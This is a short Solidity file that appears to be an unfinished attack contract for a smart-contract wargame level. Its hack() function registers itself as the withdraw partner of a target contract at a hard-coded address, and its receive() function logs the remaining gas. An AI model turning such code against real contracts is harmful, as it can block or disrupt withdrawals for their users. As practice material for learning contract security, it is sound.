// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;


interface ITarget {
    function setWithdrawPartner(address _partner) external;
    function withdraw() external;
    function contractBalance() external view returns (uint256);
    receive() external payable;
}

contract Hack {
    event Log(uint256);
    ITarget public target = ITarget(payable(0xe61FDeDBcb68e8966c869E51eAb9020cFAAdf066));
    constructor() {

    }

    function hack() public {
        target.setWithdrawPartner(address(this));


    }

    receive() external payable {
        emit Log(gasleft());
    }


}